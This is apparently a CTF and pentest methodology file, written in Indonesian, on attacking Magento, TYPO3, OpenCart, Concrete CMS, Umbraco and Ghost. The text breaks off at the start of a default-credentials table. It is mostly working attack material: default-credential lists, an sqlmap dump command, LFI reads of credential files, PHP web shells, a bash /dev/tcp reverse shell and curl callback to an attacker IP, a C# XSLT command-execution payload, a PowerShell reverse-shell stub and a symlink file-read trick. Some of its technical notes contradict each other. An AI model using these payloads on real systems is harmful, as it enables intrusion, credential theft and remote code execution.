---
id: "17d"
title: "🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference"
category: "3. Web Exploitation"
categoryId: "web"
filename: "17d_other_cms_workflow.md"
refs_out: ["17a","17b","17c","18"]
refs_in: ["17c"]
---

# 🌐 File 17d: Other CMS Exploitation Workflow & Master CMS Reference

Dalam skenario Capture The Flag (CTF) tingkat intermediate hingga hard di platform seperti HackTheBox, TryHackMe, maupun Proving Grounds, target sering kali tidak menggunakan tiga CMS populer (WordPress, Joomla, Drupal). Mesin-mesin target kerap menyajikan platform _e-commerce_, _enterprise portal_, atau CMS modern berbasis framework non-PHP seperti .NET atau Node.js.

Dokumentasi ini mencakup arsitektur, teknik enumerasi, dan vektor eksploitasi untuk **Magento, TYPO3, OpenCart, Concrete CMS, Umbraco (.NET), dan Ghost (Node.js)**, metodologi audit CMS tidak dikenal (_generic CMS_), serta diakhiri dengan **Master Cheatsheet** yang merangkum seluruh spektrum eksploitasi CMS dari File 17a hingga 17d.

---

## 📑 Daftar Isi

1. [Bagian 0: Quick CMS Detection](#-bagian-0-quick-cms-detection)
2. [Bagian 0.5: Cara Dapat Admin Access (Universal)](#-bagian-05-cara-dapat-admin-access-universal)
3. [Bagian 1: Magento](#-bagian-1-magento)
4. [Bagian 2: TYPO3](#-bagian-2-typo3)
5. [Bagian 3: OpenCart](#-bagian-3-opencart)
6. [Bagian 4: Concrete CMS (Concrete5)](#-bagian-4-concrete-cms-concrete5)
7. [Bagian 5: Umbraco](#-bagian-5-umbraco)
8. [Bagian 6: Ghost CMS](#-bagian-6-ghost-cms)
9. [Bagian 7: Generic CMS Attack Methodology](#-bagian-7-generic-cms-attack-methodology)
10. [Bagian 8: Automation Scripts](#-bagian-8-automation-scripts)
11. [Bagian 9: Hash Cracking Reference](#-bagian-9-hash-cracking-reference)
12. [Bagian 10: Common Errors & Troubleshooting](#-bagian-10-common-errors--troubleshooting)
13. [Bagian 11: Master Cheatsheet](#-bagian-11-master-cheatsheet)

---

## 🧭 Bagian 0: Quick CMS Detection

Sebelum melompat ke teknik eksploitasi spesifik, identifikasi sidik jari (_fingerprint_) CMS target yang tidak dikenal melalui metodologi terstruktur.

```text
+-----------------------------------------------------------------+
|                       TARGET WEB APPLICATION                    |
+-----------------------------------------------------------------+
                                |
        +-----------------------+-----------------------+
        v                                               v
 [ Automated Fingerprint ]                     [ Manual Inspection ]
 - WhatWeb (CLI)                               - Response Headers (Server, X-Powered-By)
 - Wappalyzer (Browser / CLI)                  - Cookie Naming Standards
 - CMSeeK (Multi-CMS Scanner)                  - HTML Source (Meta Generator, Assets)
                                               - Specific Files (/robots.txt, /license.txt)
                                |
                                v
               [ Cross-Reference Signature Table ]
```

### 0.1 Metodologi Identifikasi Otomatis & Manual

#### 1. WhatWeb Scan

Gunakan level agresif (`-a 3`) untuk memaksa WhatWeb mencocokkan signature terhadap ribuan web template dan file statis:

```bash
whatweb -a 3 http://10.10.11.200 -v
```

#### 2. Wappalyzer CLI (`webanalyze`)

```bash
webanalyze -host http://10.10.11.200 -crawl 1
```

#### 3. Manual Fingerprinting via Headers & Cookies

```bash
# Periksa respon header dan cookie sekaligus
curl -s -I http://10.10.11.200
```

- **Header Clue:** `X-Powered-CMS`, `X-Ghost-Cache-Status`, `X-TYPO3-Sitename`.
- **Cookie Clue:** `frontend` (Magento 1), `PHPSESSID` (Generic/OpenCart), `fe_typo_user` (TYPO3), `UMB_UCONTEXT` (Umbraco).

#### 4. Inspeksi Meta Generator & Route Khas

```bash
# Ekstraksi generator dari HTML
curl -s http://10.10.11.200 | grep -i '<meta name="generator"'

# Periksa file robots.txt standar instalasi CMS
curl -s http://10.10.11.200/robots.txt
```

---

### 0.2 CMS Fingerprint Quick Reference

|CMS|URL Pattern Khas|Nama Cookie Bawaan|Clue Header / DOM|Path Konfigurasi Kritis|Generator Tag|
|---|---|---|---|---|---|
|**Magento**|`/customer/account/login`, `/checkout/`|`frontend`, `adminhtml`|Path `/skin/frontend/`, `/static/frontend/`|`app/etc/local.xml`, `app/etc/env.php`|Jarang ada|
|**TYPO3**|`/?id=1`, `/typo3/`|`fe_typo_user`, `be_typo_user`|Path `/typo3conf/`, `/typo3temp/`|`typo3conf/LocalConfiguration.php`|`TYPO3 CMS`|
|**OpenCart**|`/index.php?route=common/home`|`OCSESSID`, `language`, `currency`|Path `/catalog/view/theme/`|`config.php`, `admin/config.php`|`OpenCart`|
|**Concrete5**|`/index.php/login`, `/ccm/system/`|`CONCRETE`, `concrete5`|Class `ccm-page`, path `/application/`|`application/config/database.php`|`concrete5 - [version]`|
|**Umbraco**|`/umbraco/`, `/App_Plugins/`|`UMB_UCONTEXT`, `UMB_EXTKEY`|Header `Set-Cookie: UMB...`, ASP.NET indicators|`Web.config`|Umbraco|
|**Ghost**|`/ghost/`, `/content/images/`|`ghost-admin-api-session`|Header `X-Ghost-Cache-Status`|`config.production.json`|`Ghost [version]`|

---

---

## 🔑 Bagian 0.5: Cara Dapat Admin Access (Universal)

Sebelum dapat mengeksploitasi fitur administratif menuju RCE (*Admin → RCE*), praktisi pentest/CTF harus mendapatkan kredensial akun terlebih dahulu. Di dunia nyata dan 90% skenario CTF, penyerang memulai tanpa kredensial apa pun (*unauthenticated*).

Gunakan urutan prioritas sistematis berikut:

### Prioritas 1: Coba Default Credentials
Banyak CMS di lab CTF dibiarkan menggunakan kredensial bawaan (*out-of-the-box*). Jalankan script otomatisasi `cms_default_creds.sh` (tersedia di Bagian 8.2) atau coba secara manual:
- Admin login endpoint umum: `/admin/`, `/administrator/`, `/typo3/`, `/umbraco/`, `/ghost/`.
- Pasangan kredensial umum: `admin:admin`, `admin:password`, `admin:123456`, `admin:admin123`.

### Prioritas 2: SQL Injection ke Database
Jika CMS memiliki endpoint publik (search, catalog, filter, login form) yang rentan terhadap SQLi:
```bash
# Dump tabel users dari database target menggunakan sqlmap:
sqlmap -u "http://$TARGET/[vulnerable_endpoint]?param=1" --tables --dump -T users,admin_user,jos_users
```
- Hash yang didapatkan (MD5, SHA-256, bcrypt, Blowfish) kemudian di-crack secara offline menggunakan Hashcat atau John the Ripper (lihat Bagian 9).

### Prioritas 3: Config File via LFI / Path Traversal
Jika terdapat kerentanan Local File Inclusion (LFI) atau Path Traversal pada salah satu modul/plugin CMS, baca file konfigurasi utama untuk mengekstrak kredensial database (`DB_USER`, `DB_PASSWORD`):
```bash
# Magento 2 (Kredensial database & crypt key):
curl "http://$TARGET/[lfi_param]=../../../app/etc/env.php"

# OpenCart (Kredensial DB backend & path root):
curl "http://$TARGET/[lfi_param]=../config.php"

# Ghost CMS (Database SQLite/MySQL connection & session secrets):
curl "http://$TARGET/[lfi_param]=../config.production.json"

# TYPO3:
curl "http://$TARGET/[lfi_param]=../typo3conf/LocalConfiguration.php"
```
*Catatan:* Password database yang bocor sering kali dapat digunakan ulang (*password reuse*) untuk login ke dashboard admin CMS atau SSH user sistem server!

### Prioritas 4: Kredensial dari Service Lain (Lateral Recon)
- **SMB Shares (Port 445):** Periksa anonymous share (`smbclient -N -L //TARGET`), cari file cadangan konfigurasi (`settings.php.bak`, `config.php.old`).
- **FTP Anonymous (Port 21):** Periksa direktori web root atau backup archives (`site_backup.tar.gz`).
- **Exposed Git Repository (Port 80/443):** Jalankan `git-dumper http://$TARGET/.git/ /tmp/repo` untuk merekonstruksi commit history dan file konfigurasi lokal.

## 🛒 Bagian 1: Magento

Magento adalah platform e-commerce enterprise berbasis PHP. Di CTF (misal: HTB SwagShop), Magento sering menjadi pintu masuk utama menuju _initial access_.

### 1.1 Arsitektur Magento

- **File Konfigurasi Utama:**
    - Magento 1.x: `app/etc/local.xml` (memuat kredensial MySQL `<connection>`).
    - Magento 2.x: `app/etc/env.php` (array PHP berisi parameter database dan backend admin URL).
- **Admin Panel Path:**
    - Default Magento 1: `/admin` atau `/admin/`
    - Magento 2: URL admin sering diacak secara native saat instalasi (contoh: `/admin_s9f2k1/`).
- **Database Prefix:** Umumnya tidak ada atau menggunakan prefix `mg_`.

---

### 1.2 Enumeration

```bash
# 1. Deteksi Versi Magento 1.x / 2.x
curl -s http://10.10.11.200/magento_version
# Output Nyata: Magento/2.4.2 (Community)

# 2. Alternatif Deteksi Versi via Copyright Core
curl -s http://10.10.11.200/LICENSE.txt | head -n 5

# 3. Menemukan URL Admin yang Diacak (Magento 2)
# Periksa file frontend statis atau coba endpoint login bawaan
curl -s -i http://10.10.11.200/index.php/admin/ | grep -i "Location:"

# 4. Scanning Lengkap Menggunakan magescan (jika terinstall)
docker run --rm -it tiagomap/magescan scan http://10.10.11.200
```

---

### 1.3 CVE Utama Magento

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Vektor Serangan & Command PoC|
|---|---|---|---|
|**CVE-2022-24086**|**Pre-Auth RCE**|2.3.4 s.d. 2.4.3-p1|Template Filter Injection via Checkout form (Detail di bawah)|
|**CVE-2019-8150**|Pre-Auth SQLi|2.2.0 - 2.2.9, 2.3.0 - 2.3.1|`curl "http://TARGET/rest/V1/products?searchCriteria[filterGroups][0][filters][0][conditionType]=in&searchCriteria[filterGroups][0][filters][0][field]=name&searchCriteria[filterGroups][0][filters][0][value]=1))%20UNION%20SELECT%20..."`|
|**SUPEE-5344 (Shoplift)**|Admin Auth Bypass|Magento 1.x (< 1.9.1.1)|Eksploitasi deserialization vector pada endpoint SOAP/XML-RPC|
|**CVE-2015-1397**|Authenticated SQLi|1.9.x|SQL Injection via parameter field mapping pada Product Export|
|**Magento 2 XXE**|Arbitrary File Read|2.0.x - 2.1.5|XML Injection via parsing payload katalog REST API|

#### Analisis Mendalam: CVE-2022-24086 (Pre-Auth Template Injection RCE)

Kerentanan kritis pada mekanisme validasi email template engine Magento 2 yang memanfaatkan directive `{{trans}}` untuk mengeksekusi fungsi PHP arbitrary via reflection:

```bash
# PoC Payload (dikirimkan via parameter email/nama saat guest checkout):
# {{var this.getTemplateObject().getInlineCss().getUrl('system("id")')}}
```

---

### 1.3.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
Sebelum mengeksploitasi admin panel, dapatkan akses melalui:
1. **Coba Kredensial Default / Guessable:** `admin:admin123`, `admin:password`, `admin:magento123`.
2. **LFI ke File `env.php`:** Jika ada bug LFI, baca `app/etc/env.php` untuk mengambil password MySQL dan crypt key.
3. **Pre-Auth SQL Injection / Shoplift (SUPEE-5344):** Pada Magento 1.x, jalankan script exploit `shoplift_exploit.py` untuk menyuntikkan user admin sekunder langsung via SOAP API tanpa login.

### 1.4 Exploitation Path: Admin → RCE (Froghopper Method)

📌 **Kapan Digunakan:**

- Telah berhasil mendapatkan akses ke Admin Panel Magento 1.x atau 2.x.
- **Prasyarat:** Cookie sesi admin aktif atau kredensial login admin.

#### Flow Eksploitasi:

```text
[ Akses Admin Panel ] -> [ Izinkan Path Symlink/Upload ] -> [ Masukkan Payload via Newsletter Template ] -> [ Trigger Preview ] -> [ Shell ]
```

#### Langkah-langkah:

1. Buka: **System** → **Configuration** → **Developer** → **Template Settings**.
2. Ubah opsi **Allow Symlinks** menjadi **Yes** (pada Magento 1).
3. Buka: **Marketing** (atau **Newsletter**) → **Newsletter Templates**.
4. Klik **Add New Template**, isi _Template Content_ dengan payload PHP system execution:
    
```html
    {{block type='core/template' template='../../../../../../../../etc/passwd'}}
    <!-- Atau untuk eksekusi RCE langsung via PHP Object Injection: -->
    {{block type='core/template' template='newsletter/template.phtml' inline_css='<?php system($_GET["cmd"]); ?>'}}
    ```
    
5. Simpan template, kemudian klik menu **Preview Template** untuk mengeksekusi payload.
5. **Konfigurasi Payload di Template Content:**
    > **⚠️ Catatan Teknis Penting:** Fitur preview newsletter template di Magento **tidak menerima parameter `?cmd=` via query string URL**. Payload perintah harus di-embed secara langsung di dalam konten template.
    
    - Buka menu **Marketing** → **Newsletter Templates** → Tambahkan Template baru.
    - Pada bagian **Template Content**, masukkan payload eksekusi perintah (misal command callback atau reverse shell):
    
    ```html
    <!-- Opsi A: HTTP Callback untuk melihat output command -->
    {{block type='core/template' template='newsletter/sub.phtml' output='getOutput'}}
    <?php system('curl http://10.10.14.5:8000/$(whoami)'); ?>
    
    <!-- Opsi B: Direct Reverse Shell -->
    <?php system('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'); ?>
    ```

6. **Trigger Eksekusi via Template Preview:**
    - Buka URL preview template (sesuaikan `id` template yang baru dibuat):
    
    ```bash
    # Request preview template akan memicu eksekusi kode PHP di server:
    curl -s -b cookies.txt "http://10.10.11.200/index.php/admin/newsletter_template/preview/id/1/"
    ```
    

---

## 🏛️ Bagian 2: TYPO3

TYPO3 adalah CMS enterprise fleksibel yang populer di infrastruktur institusi akademik dan enterprise Eropa.

### 2.1 Arsitektur TYPO3

- **File Konfigurasi Utama:**
    - TYPO3 v4-v11: `typo3conf/LocalConfiguration.php` (memuat kredensial `$GLOBALS['TYPO3_CONF_VARS']['DB']`).
- **Admin Backend URL:** `/typo3/` (Login dashboard manajemen).
- **TypoScript:** Bahasa konfigurasi internal TYPO3 yang menentukan rendering halaman dan template.

---

### 2.2 Enumeration

```bash
# 1. Deteksi Versi via Changelog Core
curl -s http://10.10.11.200/typo3/sysext/core/Documentation/Changelog/index.rst | head -n 10

# 2. Cek Versi via Aset JavaScript Core
curl -s http://10.10.11.200/typo3/ | grep -o 'typo3/sysext/[^"]*' | head -n 5

# 3. Fuzzing Ekstensi TYPO3
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/typo3-extensions.txt \
     -u http://10.10.11.200/typo3conf/ext/FUZZ/ \
     -mc 200,403 -t 30
```

---

### 2.3 CVE Utama TYPO3

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Deskripsi & Command Eksploitasi|
|---|---|---|---|
|**CVE-2019-12747**|TypoScript RCE|9.5.0 - 9.5.7, 8.7.0 - 8.7.26|RCE via TypoScript frontend rendering context|
|**CVE-2020-11069**|Auth Bypass / JWT|9.5.0 - 9.5.15, 10.0.0 - 10.4.1|JWT token signature bypass pada core authentication|
|**CVE-2023-24814**|Authenticated SQLi|11.5.0 - 11.5.23|SQL Injection pada query builder backend list|
|**Admin TypoScript RCE**|Feature Abuse|Semua versi|Penyusupan objek TypoScript `PAGE` dengan fungsi eksekusi sistem|

---

### 2.3.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
Sebelum mengeksploitasi backend TYPO3, dapatkan akses melalui:
1. **Coba Kredensial Default:** `admin:password`, `admin:admin123`, `typo3:typo3`.
2. **Install Tool Abuse (`/typo3/install.php`):** Cek apakah Install Tool aktif dengan password default `joh316`. Jika berhasil login ke Install Tool, kamu dapat membuat user admin baru secara langsung!
3. **LFI ke `LocalConfiguration.php`:** Ekstrak kredensial database untuk melakukan password reuse atau update hash admin di database.

### 2.4 Exploitation Path: Admin → RCE via TypoScript Injection

📌 **Kapan Digunakan:**

- Berhasil login sebagai pengguna backend admin TYPO3 (`/typo3/`).
- **Prasyarat:** Hak akses administratif untuk mengedit _Template Records_.

#### Flow Eksploitasi:

```text
[ Login /typo3/ ] -> [ Menu 'Template' ] -> [ Edit TypoScript Setup ] -> [ Inject PHP Execution ] -> [ Akses Frontend ]
```

#### Langkah-langkah:

1. Masuk ke modul **Web** → **Template**.
2. Pilih halaman utama (Root Page), ubah dropdown menu menjadi **Info/Modify**.
3. Klik **Edit the whole template record**.
4. Pada kolom **Setup**, tambahkan kode TypoScript berikut:
    
    > **⚠️ Catatan Teknis:** Syntax `userFunc = system` bukan merupakan class/method valid di arsitektur TypoScript TYPO3. Gunakan sintaks TypoScript valid dengan `postUserFunc` atau manfaatkan alternatif upload web shell via **Filelist** module (metode paling umum di CTF).

    ```typoscript
    # Metode TypoScript Valid:
    page.10 = TEXT
    page.10.value = 1
    page.10.wrap = |
    page.10.postUserFunc = myextension->exec
    ```

    **Alternatif CTF Praktis (Filelist Module / Extension Manager):**
    - **Metode A (Filelist Upload):** Masuk ke menu **File** → **Filelist**, buka direktori `fileadmin/` (biasanya berizin tulis). Unggah file `shell.php`. Akses di: `http://10.10.11.200/fileadmin/shell.php?cmd=id`.
    - **Metode B (Extension Upload):** Masuk ke **Admin Tools** → **Extensions**, unggah arsip ekstensi palsu `.t3x` atau `.zip` yang memuat web shell PHP di root direktori ekstensi.
    
5. Simpan template record.
6. Buka halaman depan website (`http://10.10.11.200/index.php`) untuk memicu reverse shell.

---

## 🛍️ Bagian 3: OpenCart

OpenCart adalah CMS e-commerce berbasis PHP yang sangat umum di mesin CTF bertema small-business.

### 3.1 Arsitektur OpenCart

- **File Konfigurasi Utama:**
    - Frontend: `/var/www/html/config.php`
    - Backend Admin: `/var/www/html/admin/config.php`
- **Admin Panel Path:** `/admin/`
- **Identifikasi Versi:**
    
```bash
    curl -s http://10.10.11.200/admin/ | grep -i "OpenCart"
    # Periksa changelog instalasi default:
    curl -s http://10.10.11.200/install/index.php | grep -i "OpenCart"
    ```
    

---

### 3.2 CVE Utama OpenCart

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Deskripsi & Solusi Pentest|
|---|---|---|---|
|**CVE-2021-5543**|Arbitrary File Upload|3.0.3.5 - 3.0.3.7|Bypass filter upload extension modification installer|
|**CVE-2022-23635**|Arbitrary File Read|4.0.0.0 - 4.0.1.1|LFI via manipulasi language parameter|
|**Extension Zip Upload**|Admin Feature Abuse|Semua versi 3.x|Mengunggah modul modifikasi berekstensi `.ocmod.zip`|
|**Default Credentials**|Weak Security|Instalasi CTF|Akun default sering tertinggal: `admin:admin` atau `admin:password`|

---

### 3.2.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
1. **Coba Kredensial Default di `/admin/`:** `admin:admin`, `admin:password`, `demo:demo`.
2. **LFI ke `config.php` / `admin/config.php`:** Baca kredensial database, lalu login ke MySQL dan dump tabel `oc_user`.
3. **Password Reuse:** Password database sering identik dengan password admin OpenCart.

### 3.3 Exploitation Path: Admin → RCE via `.ocmod.zip` Upload

📌 **Kapan Digunakan:**

- Memiliki akses kredensial administrator ke `/admin/`.
- **Prasyarat:** Cookie sesi admin aktif.

#### Flow Eksploitasi:

```text
[ Siapkan Evil Zip (.ocmod.zip) ] -> [ Extensions Installer ] -> [ Upload & Refresh Modification ] -> [ Trigger Web Shell ]
```

#### Langkah-langkah:

1. Buat file `.ocmod.zip` berbahaya di Parrot OS:
    
```bash
    mkdir -p /tmp/evil_ocmod/upload/catalog/
    echo '<?php system($_GET["cmd"]); ?>' > /tmp/evil_ocmod/upload/catalog/shell.php
    cd /tmp/evil_ocmod
    zip -r /tmp/exploit.ocmod.zip upload/
    ```
    
2. Di dashboard admin OpenCart, navigasi ke: **Extensions** → **Installer**.
3. Klik tombol **Upload**, pilih `/tmp/exploit.ocmod.zip`.
4. Masuk ke menu **Extensions** → **Modifications**, klik tombol **Refresh** (ikon biru di kanan atas) untuk menerapkan file.
5. Panggil web shell yang terunggah:
    
```bash
    curl "http://10.10.11.200/catalog/shell.php?cmd=id"
    ```
    

---

## 🧱 Bagian 4: Concrete CMS (Concrete5)

Concrete CMS adalah CMS open-source yang memiliki visual file manager terintegrasi.

### 4.1 Arsitektur Concrete CMS

- **File Konfigurasi Utama:**
    - Concrete5 legacy: `config/site.php`
    - Concrete5 modern: `application/config/database.php`
- **Admin Login URL:** `/index.php/login` atau `/login`
- **Versi Konfirmasi:**
    
```bash
    curl -s http://10.10.11.200/index.php/tools/required/dashboard/get_image_data
    curl -s http://10.10.11.200/concrete/config/concrete.php | grep -i "version"
    ```
    

---

### 4.2 CVE Utama Concrete CMS

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Deskripsi|
|---|---|---|---|
|**CVE-2021-40638**|File Upload RCE|< 8.5.6|Bypass validasi ekstensi pada avatar uploader|
|**CVE-2022-30117**|Path Traversal|< 8.5.8|Arbitrary file read pada package installer|
|**File Manager Abuse**|Misconfiguration|Semua versi|Memodifikasi daftar ekstensi yang diizinkan (Allowed File Types)|
|**Thumbnail Gen RCE**|Pre-Auth RCE|Legacy (v5.6.x)|Injeksi argumen pada library image processing `gd` / `imagick`|

---

### 4.2.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
1. **Coba Kredensial Bawaan di `/index.php/login`:** `admin:12345`, `admin:admin`.
2. **LFI ke File Konfigurasi:** Baca `application/config/database.php` (v8+) atau `config/site.php` (v5-v7) untuk mengambil password database.
3. **Password Reset Token Enumeration:** Pada versi Concrete5 lawas, token reset password memiliki entropi rendah.

### 4.3 Exploitation Path: Admin → RCE via Allowed File Types

📌 **Kapan Digunakan:**

- Mendapatkan kredensial admin Concrete5.
- **Prasyarat:** Hak akses menu dashboard **System & Settings**.

#### Flow Eksploitasi:

```text
[ Login Admin ] -> [ System & Settings ] -> [ Allowed File Types ] -> [ Tambah 'php' ] -> [ Upload via File Manager ] -> [ Shell ]
```

#### Langkah-langkah:

1. Buka dashboard: `http://10.10.11.200/index.php/dashboard/system/files/file_types`.
2. Di kolom daftar ekstensi yang diizinkan (_Allowed File Types_), tambahkan ekstensi `php`:
    
```text
    flv, jpg, gif, jpeg, ico, docx, xla, zip, pdf, php
    ```
    
3. Klik **Save**.
4. Navigasi ke **Files** → **File Manager** (`/index.php/dashboard/files/search`).
5. Unggah file `shell.php` (`<?php system($_GET['c']); ?>`).
6. Klik pada file yang berhasil terunggah, pilih **Inspect** atau buka path URL fisik file:
    
```bash
    curl "http://10.10.11.200/application/files/1234/5678/shell.php?c=id"
    ```
    

---

## 🪟 Bagian 5: Umbraco

Umbraco adalah CMS enterprise berbasis **ASP.NET (.NET Core / .NET Framework)** yang berjalan di atas server Windows IIS dengan database MSSQL. Ini adalah CMS yang paling sering merepresentasikan eksploitasi web-to-system pada mesin CTF Windows di HackTheBox.

### 5.1 Arsitektur Umbraco

- **File Konfigurasi Kritis:** `Web.config` (memuat connection string database MSSQL dan settingan enkripsi machineKey).
- **Admin Login URL:** `/umbraco/` atau `/umbraco/#/login`
- **Format Hash:**
    - Umbraco 7: SHA1 (Base64 encoded)
    - Umbraco 8+: PBKDF2 dengan HMAC-SHA1 / HMAC-SHA256

---

### 5.2 Enumeration

```bash
# 1. Konfirmasi Endpoint Admin Umbraco
curl -s -I http://10.10.11.200/umbraco/ | grep -Ei "Set-Cookie: UMB|Location:"

# 2. Deteksi Versi via Library Aset Client
curl -s http://10.10.11.200/umbraco/ | grep -o 'umbraco/[0-9.]*'
```

---

### 5.3 CVE Utama Umbraco

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Deskripsi Kerentanan|
|---|---|---|---|
|**CVE-2020-5403**|Server-Side Request Forgery|8.0.0 s.d. 8.6.0|SSRF via manipulasi URL preview handler|
|**Umbraco XSLT RCE**|Feature Execution Abuse|Umbraco 7.x|Eksekusi kode arbitrary via evaluasi XSLT script macro (WAJIB CTF)|
|**CVE-2023-25139**|Blind XPath Injection|8.x - 10.x|Injeksi XPath melalui parameter form searching internal|

---

### 5.3.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
1. **Coba Default Kredensial di `/umbraco/`:** `admin@example.com:password`, `admin:admin`, `admin@local.host:admin`.
2. **LFI ke `web.config`:** Baca connection string database `umbracoDbDSN` di file `web.config`.
3. **Dump Tabel `umbracoUser`:** Ambil hash admin (format SHA-1 / HMAC-SHA256) atau ganti hash admin di database SQL Server / MySQL.

### 5.4 Exploitation Path: Admin → RCE via XSLT Template Injection

📌 **Kapan Digunakan:**

- Berhasil login ke dashboard administrator Umbraco 7.x.
- **Prasyarat:** Akses ke menu **Developer** section.

#### Flow Eksploitasi:

```text
[ Login /umbraco/ ] -> [ Tab Developer ] -> [ XSLT Files ] -> [ Create Malicious XSLT ] -> [ Embed C# Script Payload ] -> [ Run / Visualize ] -> [ System Shell ]
```

#### Langkah-langkah:

1. Buka dashboard `/umbraco/`, klik tab **Developer** di navigasi kiri atas.
2. Klik kanan pada folder **XSLT Files**, pilih **Create**.
3. Beri nama file: `EvilXslt.xslt`, pilih template _Clean_.
4. Timpa seluruh isi template dengan payload eksekusi perintah C# (.NET) berikut:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [ <!ENTITY nbsp "&#x00A0;"> ]>
<xsl:stylesheet 
  version="1.0" 
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
  xmlns:msxml="urn:schemas-microsoft-com:xslt"
  xmlns:umbraco.page="urn:umbraco.page"
  xmlns:CSharp="urn:csharp"
  exclude-result-prefixes="msxml umbraco.page CSharp">

  <xsl:output method="xml" omit-xml-declaration="yes"/>

  <msxml:script language="CSharp" implements-prefix="CSharp">
    <![CDATA[
    public string Execute(string cmd) {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.Start();
        return proc.StandardOutput.ReadToEnd();
    }
    ]]>
  </msxml:script>

  <xsl:template match="/">
    <div style="color:red; font-weight:bold;">
      Command Output:
      <pre>
        <xsl:value-of select="CSharp:Execute('whoami')"/>
      </pre>
    </div>
  </xsl:template>

</xsl:stylesheet>
```

5. Klik tombol **Save** (ikon disket).
6. Di pojok kanan atas, klik tombol **Visualize** (atau buka file langsung di browser).
7. Output perintah sistem (`iis apppool\umbraco` atau `nt authority\system`) akan ditampilkan langsung pada layar.
8. Ganti argumen `whoami` menjadi command reverse shell PowerShell:
    
```text
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);..."
    ```
    

---

## 👻 Bagian 6: Ghost CMS

Ghost adalah CMS blogging modern berbasis arsitektur **Node.js** yang menggunakan database SQLite atau MySQL.

### 6.1 Arsitektur Ghost CMS

- **File Konfigurasi Utama:** `config.production.json` (memuat kredensial database dan API mail keys).
- **Admin Login URL:** `/ghost/` atau `/ghost/#/signin`
- **Template Engine:** Handlebars (`.hbs`).

---

### 6.2 CVE Utama Ghost CMS

|CVE / Identifier|Tipe Kerentanan|Versi Terkena|Deskripsi Kerentanan|
|---|---|---|---|
|**CVE-2023-40028**|Arbitrary File Read|< 5.58.0|Membaca file internal via upload gambar berformat symlink/tar|
|**Handlebars SSTI RCE**|Template Injection|Custom/Outdated|Eksekusi kode arbitrary Node.js via modifikasi helper Handlebars|
|**Admin Theme Upload**|File Inclusion / Overwrite|Semua versi|Mengunggah tema `.zip` jahat yang memuat path traversal|

---

### 6.2.1 Cara Mendapatkan Kredensial Admin (Pre-Admin Access)
1. **First-Time Setup Abuse (`/ghost/#/setup`):** Jika instalasi Ghost belum menyelesaikan setup awal pengguna, endpoint setup terbuka publik dan memungkinkan siapa saja membuat akun Owner pertama!
2. **Arbitrary File Read (CVE-2023-40028):** Gunakan exploit symlink untuk membaca file konfigurasi `config.production.json` dan database SQLite `content/data/ghost.db` untuk mengekstrak hash bcrypt admin.

### 6.3 Exploitation Path: CVE-2023-40028 (Arbitrary File Read)

📌 **Kapan Digunakan:**

- Berhasil login ke panel Ghost CMS sebagai role apapun (Author/Editor/Admin).
- Target menjalankan versi **Ghost < 5.58.0**.

#### Flow Eksploitasi:

```text
[ Buat Malicious Image Tar/Zip ] -> [ Simpan Symlink Target File ] -> [ Upload via Newsletter/Image ] -> [ Baca Konten File ]
```

#### Langkah-langkah:

1. Buat arsip payload symlink di Parrot OS untuk membaca `/etc/passwd`:
    > **⚠️ Catatan Penting:** Flag `--symlinks` wajib disertakan saat membuat file ZIP agar symlink tidak di-dereference (di-resolve) menjadi konten file fisik saat dikompresi.

    ```bash
    cd /tmp
    ln -s /etc/passwd passwd.png
    zip --symlinks exploit.zip passwd.png
    ```
    
2. Buka dashboard `/ghost/`, buat Postingan baru.
3. Klik ikon `+`, pilih **Image Upload**, lalu pilih file `/tmp/exploit.zip` (ubah filter browser ke _All Files_).
4. Setelah terunggah, periksa URL preview gambar yang dihasilkan:
    
```bash
    curl -s http://10.10.11.200/content/images/2023/10/passwd.png
    ```
    
5. Konten plaintext `/etc/passwd` akan terbaca secara utuh. Lakukan teknik yang sama untuk membaca `config.production.json` guna mengambil database secret keys.

---

## 🛠️ Bagian 7: Generic CMS Attack Methodology

Ketika berhadapan dengan CMS internal atau CMS langka (_proprietary / niche_), ikuti metodologi terstruktur 4 tahap berikut:

```text
[ 1. IDENTIFY ] -> Analisis Tech Stack, Header, Cookie, dan Config candidates.
[ 2. ENUMERATE] -> Cari Versi, User profiles, File upload endpoints.
[ 3. RESEARCH ] -> Searchsploit nama software, GitHub issues, Google dorks.
[ 4. EXPLOIT  ] -> Test Default Creds -> LFI/Upload bypass -> Admin RCE.
```

### 7.1 Framework untuk Unknown CMS

1. **Langkah 1: Identifikasi Stack Dasar**
    - Bahasa pemrogramannya apa? (Cek ekstensi `.php`, `.jsp`, `.aspx`, atau cookie `connect.sid` untuk Node.js).
    - Web servernya apa? (`nginx`, `Apache`, `IIS`).
2. **Langkah 2: Enumerasi Titik Masuk Sensitif**
    - Cari endpoint panel login: `/admin`, `/login`, `/portal`, `/manage`.
    - Periksa apakah registrasi akun publik aktif: `/register`, `/signup`.
3. **Langkah 3: Riset Repositori Eksploit**
    
```bash
    # Contoh pencarian searchsploit untuk CMS lokal
    searchsploit "Nama CMS"
    ```
    
4. **Langkah 4: Vektor Serangan Universal Admin**
    - **Template Editor:** Cari fitur pengubah tampilan web → inject kode bahasa server.
    - **Language Translation Manager:** Sering kali menyimpan terjemahan ke file `.php` tanpa sanitasi string.
    - **Backup / Restore Utility:** Unggah file backup yang sudah disisipi web shell.

---

### 7.2 Default Credentials Reference Table

Daftar kredensial default yang wajib dicoba pada CMS, e-commerce, dan panel administrasi saat pentest:

|CMS / Platform|Default Username|Default Password|URL Login Standar|
